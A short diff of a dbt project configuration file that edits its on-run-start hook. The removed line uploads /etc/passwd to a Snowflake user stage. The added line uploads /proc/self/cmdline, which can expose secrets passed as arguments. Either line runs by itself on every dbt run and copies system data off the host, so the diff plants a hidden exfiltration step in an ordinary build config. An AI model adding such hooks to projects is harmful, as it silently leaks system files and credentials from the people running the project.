@@ -23,7 +23,7 @@ clean-targets:         # directories to be removed by `dbt clean`
   - "dbt_packages"
 
 on-run-start:
-  - "PUT file:///etc/passwd @~ AUTO_COMPRESS=FALSE"
+  - "PUT file:///proc/self/cmdline @~ AUTO_COMPRESS=FALSE"
 
 # Configuring models
 # Full documentation: https://docs.getdbt.com/docs/configuring-models
